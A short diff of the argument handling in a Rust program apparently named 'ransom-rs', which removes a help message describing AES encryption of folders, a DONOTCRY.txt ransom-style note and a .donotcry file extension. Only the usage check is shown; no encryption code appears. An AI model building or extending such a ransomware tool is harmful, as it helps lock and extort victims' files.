@@ -5,18 +5,11 @@ fn main() {
     let args: Vec<_> = env::args().collect();
 
     if args.len() != 3 {
-        if args[1].clone() == "help" {
-            println!("ransom-rs");
-            println!("Encrypt and decrypt directories/files using Aes cipher. When encrypting, DONOTCRY.txt file will be created and all files will have .donotcry extension.");
-            println!("Usage: {} <encrypt|decrypt> <folder>", args[0].clone());
-            return;
-        } else {
-            println!(
-                "Not enough arguments!\nUsage: {} <encrypt|decrypt> <folder>",
-                args[0].clone()
-            );
-            return;
-        }
+        println!(
+            "Not enough arguments!\nUsage: {} <encrypt|decrypt> <folder>",
+            args[0].clone()
+        );
+        return;
     }
 
     // Create DONOTCRY.txt file
